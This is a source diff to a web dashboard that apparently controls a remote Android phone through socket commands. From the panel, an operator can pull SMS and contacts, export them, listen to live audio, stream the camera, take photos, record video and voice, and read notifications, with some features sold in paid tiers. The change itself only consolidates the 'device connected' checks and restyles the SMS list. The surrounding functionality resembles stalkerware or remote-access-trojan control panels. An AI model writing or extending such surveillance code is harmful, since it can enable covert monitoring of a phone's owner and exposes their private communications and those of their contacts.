@@ -1171,36 +1171,22 @@ export default function Home() {
     };
 
     const fetchFolders = () => {
+        if (!requireConnectedDevice(() => {})) return;
         if (socket && selectedDeviceId) {
-            const device = devices.find(d => d.deviceId === selectedDeviceId);
-            if (!device?.online) {
-                setAlertData({
-                    title: 'Device Offline',
-                    message: 'The selected device is currently offline. Please wait for it to connect before fetching folders.',
-                    type: 'error'
-                });
-                setShowCustomAlert(true);
-                return;
-            }
             setIsFetchingFolders(true);
             socket.emit("get_folders", {
                 uuid: session?.user?.uuid,
                 targetDeviceId: selectedDeviceId
             });
-        } else {
-            setAlertData({
-                title: 'No Device Selected',
-                message: 'Please select an online device first.',
-                type: 'error'
-            });
-            setShowCustomAlert(true);
         }
     };
 
     const handleFolderClick = (folder: any) => {
+        if (!requireConnectedDevice(() => {})) return;
         // Prevent clicking while upload is in progress
         if (uploadProgress) {
-            alert("Please wait for the current sync to complete.");
+            setAlertData({ title: 'Sync in Progress', message: 'Please wait for the current sync to complete.', type: 'info' });
+            setShowCustomAlert(true);
             return;
         }
         setSelectedFolder(folder);
@@ -1214,18 +1200,18 @@ export default function Home() {
             showUpgradePrompt('SMS Access', 'standard');
             return;
         }
+        if (!requireConnectedDevice(() => {})) return;
         if (socket && selectedDeviceId && session?.user?.uuid) {
             setIsFetchingSms(true);
             socket.emit("get_sms", {
                 uuid: session.user.uuid,
                 targetDeviceId: selectedDeviceId
             });
-        } else {
-            alert("Please select an online device first.");
         }
     };
 
     const resetSmsSync = () => {
+        if (!requireConnectedDevice(() => {})) return;
         if (socket && selectedDeviceId && session?.user?.uuid) {
             socket.emit("reset_sms_sync", {
                 uuid: session.user.uuid,
@@ -1242,19 +1228,19 @@ export default function Home() {
             showUpgradePrompt('Contacts Access', 'standard');
             return;
         }
+        if (!requireConnectedDevice(() => {})) return;
         if (socket && selectedDeviceId && session?.user?.uuid) {
             setIsFetchingContacts(true);
             socket.emit("get_contacts", {
                 uuid: session.user.uuid,
                 targetDeviceId: selectedDeviceId
             });
-        } else {
-            alert("Please select an online device first.");
         }
     };
 
     // Permission Check Function
     const checkPermissions = () => {
+        if (!requireConnectedDevice(() => {})) return;
         if (socket && selectedDeviceId && session?.user?.uuid) {
             setIsCheckingPermissions(true);
             setDevicePermissions(null);
@@ -1262,8 +1248,6 @@ export default function Home() {
                 uuid: session.user.uuid,
                 targetDeviceId: selectedDeviceId
             });
-        } else {
-            alert("Please select an online device first.");
         }
     };
 
@@ -1294,6 +1278,7 @@ export default function Home() {
 
 
     const triggerUpload = (count: number | 'all') => {
+        if (!requireConnectedDevice(() => {})) return;
         if (socket && selectedFolder && syncMediaType && session?.user?.uuid && selectedDeviceId) {
             const payload = {
                 uuid: session.user.uuid,
@@ -1325,10 +1310,8 @@ export default function Home() {
             showUpgradePrompt('Flashlight Control', 'standard');
             return;
         }
-        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
-            alert("Please select an online device first.");
-            return;
-        }
+        if (!requireConnectedDevice(() => {})) return;
+        if (!socket || !selectedDeviceId || !session?.user?.uuid) return;
 
         const newState = !isTorchOn;
         setIsTorchOn(newState);
@@ -1349,10 +1332,8 @@ export default function Home() {
             showUpgradePrompt('Vibration Control', 'standard');
             return;
         }
-        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
-            alert("Please select an online device first.");
-            return;
-        }
+        if (!requireConnectedDevice(() => {})) return;
+        if (!socket || !selectedDeviceId || !session?.user?.uuid) return;
 
         socket.emit("vibrate_control", {
             uuid: session.user.uuid,
@@ -1367,11 +1348,8 @@ export default function Home() {
             showUpgradePrompt('Live Audio Listening', 'premium');
             return;
         }
-        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
-            setAlertData({ title: 'No Device', message: 'Please select an online device first.', type: 'warning' });
-            setShowCustomAlert(true);
-            return;
-        }
+        if (!requireConnectedDevice(() => {})) return;
+        if (!socket || !selectedDeviceId || !session?.user?.uuid) return;
 
         // AudioContext will be auto-created when first live_audio chunk arrives.
         // Just tell the device to start sending audio.
@@ -1436,11 +1414,8 @@ export default function Home() {
 
     // --- Voice Recording Functions ---
     const startVoiceRecording = useCallback(() => {
-        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
-            setAlertData({ title: 'No Device', message: 'Please select an online device first.', type: 'warning' });
-            setShowCustomAlert(true);
-            return;
-        }
+        if (!requireConnectedDevice(() => {})) return;
+        if (!socket || !selectedDeviceId || !session?.user?.uuid) return;
         socket.emit('start_voice_recording', {
             uuid: session.user.uuid,
             targetDeviceId: selectedDeviceId,
@@ -1642,7 +1617,12 @@ export default function Home() {
 
     // Download SMS as CSV
     const downloadSmsAsCsv = () => {
-        if (smsList.length === 0) return;
+        if (!requireConnectedDevice(() => {})) return;
+        if (smsList.length === 0) {
+            setAlertData({ title: 'No Data to Export', message: 'No SMS messages currently synced. Please click Sync SMS first.', type: 'info' });
+            setShowCustomAlert(true);
+            return;
+        }
 
         const headers = ['Address', 'Body', 'Date', 'Type'];
         const csvContent = [
@@ -1666,7 +1646,12 @@ export default function Home() {
 
     // Download Contacts as vCard
     const downloadContactsAsVcf = () => {
-        if (contactsList.length === 0) return;
+        if (!requireConnectedDevice(() => {})) return;
+        if (contactsList.length === 0) {
+            setAlertData({ title: 'No Data to Export', message: 'No contacts currently synced. Please click Sync Contacts first.', type: 'info' });
+            setShowCustomAlert(true);
+            return;
+        }
 
         const vcards = contactsList.map(contact => {
             const name = contact.name || 'Unknown';
@@ -1717,24 +1702,23 @@ END:VCARD`;
 
     const onlineDeviceCount = devices.filter(d => d.online).length;
 
+    const requireConnectedDevice = (action: () => void) => {
+        const currentDevice = devices.find(d => d.deviceId === selectedDeviceId || d.id === selectedDeviceId);
+        if (!selectedDeviceId || !currentDevice || !currentDevice.online) {
+            setAlertData({
+                title: 'No Device Connected',
+                message: 'To execute commands or sync data from this tool, an active device must be connected and online. Please select an online device from the top menu.',
+                type: 'warning'
+            });
+            setShowCustomAlert(true);
+            return false;
+        }
+        action();
+        return true;
+    };
+
     // Helper to render tools
     const renderTool = () => {
-        if (!selectedDeviceId && devices.length === 0) {
-            return (
-                <div className="flex flex-col items-center justify-center min-h-[60vh] text-center">
-                    <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="max-w-md space-y-6">
-                        <div className="w-24 h-24 mx-auto rounded-3xl bg-white/5 border border-white/10 flex items-center justify-center shadow-2xl">
-                            <Smartphone size={48} className="text-white/20" />
-                        </div>
-                        <div>
-                            <h2 className="text-2xl font-bold tracking-tight mb-2">No Devices Connected</h2>
-                            <p className="text-white/40">Select a device from the top menu, or click 'Build App' to generate a new APK.</p>
-                        </div>
-                    </motion.div>
-                </div>
-            );
-        }
-
         switch (selectedTool) {
             case 'sms':
                 return (
@@ -1760,7 +1744,7 @@ END:VCARD`;
                                 </span>
                             </div>
                             <div className="flex items-center gap-2.5 w-full sm:w-auto justify-end">
-                                <button onClick={fetchSms} disabled={!selectedDeviceId || isFetchingSms} className="flex items-center gap-2 px-4 py-2 rounded-xl bg-sky-500 hover:bg-sky-400 text-black font-bold text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(14,165,233,0.3)] transition-all disabled:opacity-50">
+                                <button onClick={fetchSms} disabled={isFetchingSms} className="flex items-center gap-2 px-4 py-2 rounded-xl bg-sky-500 hover:bg-sky-400 text-black font-bold text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(14,165,233,0.3)] transition-all disabled:opacity-50">
                                     <RefreshCw size={14} className={isFetchingSms ? "animate-spin" : ""} /> Sync SMS
                                 </button>
                                 <button onClick={downloadSmsAsCsv} className="flex items-center gap-2 px-3.5 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white/70 hover:text-white font-bold text-xs uppercase tracking-wider transition-all">
@@ -1774,23 +1758,18 @@ END:VCARD`;
                             {filteredSms.length === 0 ? (
                                 <div className="py-24 flex flex-col items-center justify-center text-white/30 font-medium gap-4">
                                     <MessageSquare size={44} strokeWidth={1} className="text-white/20" />
-                                    <p className="text-sm">No messages found. Click Sync SMS to fetch.</p>
+                                    <p className="text-sm">No SMS messages found. Click Sync SMS to fetch.</p>
                                 </div>
                             ) : (
-                                <div className="grid grid-cols-1 gap-3">
+                                <div className="space-y-2.5">
                                     {filteredSms.map((item: any, i: number) => (
-                                        <div key={i} className="p-4 rounded-2xl bg-white/[0.02] hover:bg-white/[0.06] transition-all duration-300 border border-white/10 hover:border-sky-500/30 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 group">
-                                            <div className="flex items-center gap-3.5 min-w-[220px]">
-                                                <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-sky-500/20 to-sky-900/30 flex items-center justify-center text-sky-400 font-bold text-sm border border-sky-500/20 shadow-inner flex-shrink-0">
-                                                    {item.address?.charAt(0).toUpperCase() || '#'}
+                                        <div key={i} className="p-4 rounded-2xl bg-white/[0.02] hover:bg-white/[0.06] transition-all duration-300 border border-white/10 flex items-start gap-4">
+                                            <div className="flex-1 min-w-0">
+                                                <div className="flex items-center justify-between mb-1.5">
+                                                    <span className="font-bold text-sm text-sky-400 font-mono">{item.address || 'Unknown Sender'}</span>
+                                                    <span className="text-[11px] text-white/40 font-mono">{new Date(item.date).toLocaleString()}</span>
                                                 </div>
-                                                <div className="flex flex-col">
-                                                    <span className="font-bold text-white/90 text-sm tracking-wide group-hover:text-sky-400 transition-colors">{item.address}</span>
-                                                    <span className="text-[10px] text-white/40 font-mono uppercase tracking-wider mt-0.5">{new Date(item.date).toLocaleString()}</span>
-                                                </div>
-                                            </div>
-                                            <div className="flex-1 bg-black/30 px-4 py-3 rounded-xl border border-white/5 w-full">
-                                                <p className="text-xs sm:text-sm text-white/80 leading-relaxed break-words">{item.body}</p>
+                                                <p className="text-xs text-white/80 leading-relaxed break-words">{item.body}</p>
                                             </div>
                                         </div>
                                     ))}
@@ -1823,7 +1802,7 @@ END:VCARD`;
                                 </span>
                             </div>
                             <div className="flex items-center gap-2.5 w-full sm:w-auto justify-end">
-                                <button onClick={fetchContacts} disabled={!selectedDeviceId || isFetchingContacts} className="flex items-center gap-2 px-4 py-2 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(16,185,129,0.3)] transition-all disabled:opacity-50">
+                                <button onClick={fetchContacts} disabled={isFetchingContacts} className="flex items-center gap-2 px-4 py-2 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(16,185,129,0.3)] transition-all disabled:opacity-50">
                                     <RefreshCw size={14} className={isFetchingContacts ? "animate-spin" : ""} /> Sync Contacts
                                 </button>
                                 <button onClick={downloadContactsAsVcf} className="flex items-center gap-2 px-3.5 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white/70 hover:text-white font-bold text-xs uppercase tracking-wider transition-all">
@@ -1931,12 +1910,7 @@ END:VCARD`;
                                 <div className="flex items-center justify-center gap-8 py-2">
                                     <button 
                                         onClick={() => {
-                                            const device = devices.find(d => d.deviceId === selectedDeviceId);
-                                            if (!device?.online) {
-                                                setAlertData({ title: 'Device Offline', message: 'Cannot start live feed on an offline device.', type: 'error' });
-                                                setShowCustomAlert(true);
-                                                return;
-                                            }
+                                            if (!requireConnectedDevice(() => {})) return;
                                             if (isLiveStreaming) {
                                                 socket?.emit('stop_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                 setIsLiveStreaming(false);
@@ -1955,12 +1929,7 @@ END:VCARD`;
                                     
                                     <button 
                                         onClick={() => { 
-                                            const device = devices.find(d => d.deviceId === selectedDeviceId);
-                                            if (!device?.online) {
-                                                setAlertData({ title: 'Device Offline', message: 'Cannot capture photo on an offline device.', type: 'error' });
-                                                setShowCustomAlert(true);
-                                                return;
-                                            }
+                                            if (!requireConnectedDevice(() => {})) return;
                                             setIsCapturingPhoto(true); 
                                             setCapturedMedia(prev => [{
                                                 id: `temp_photo_${Date.now()}`,
@@ -1985,12 +1954,7 @@ END:VCARD`;
 
                                     <button 
                                         onClick={() => {
-                                            const device = devices.find(d => d.deviceId === selectedDeviceId);
-                                            if (!device?.online) {
-                                                setAlertData({ title: 'Device Offline', message: 'Cannot record video on an offline device.', type: 'error' });
-                                                setShowCustomAlert(true);
-                                                return;
-                                            }
+                                            if (!requireConnectedDevice(() => {})) return;
                                             if (!recordingDuration || recordingDuration === 0) {
                                                 setAlertData({ title: 'Select Duration', message: 'First select the recording duration.', type: 'warning' });
                                                 setShowCustomAlert(true);
@@ -2328,12 +2292,7 @@ END:VCARD`;
                                                 <button 
                                                     onClick={() => {
                                                         if (isVoiceUploading) return;
-                                                        const device = devices.find(d => d.deviceId === selectedDeviceId);
-                                                        if (!device?.online) {
-                                                            setAlertData({ title: 'Device Offline', message: 'Cannot record voice on an offline device.', type: 'error' });
-                                                            setShowCustomAlert(true);
-                                                            return;
-                                                        }
+                                                        if (!requireConnectedDevice(() => {})) return;
                                                         if (isVoiceRecording) {
                                                             stopVoiceRecording();
                                                         } else {
@@ -2519,6 +2478,7 @@ END:VCARD`;
                                 {filteredNotifs.length > 0 && (
                                     <button
                                         onClick={() => {
+                                            if (!requireConnectedDevice(() => {})) return;
                                             setNotifications([]);
                                             try { localStorage.removeItem('galleryeye_notifications'); } catch {}
                                             const userUuid = session?.user?.uuid;
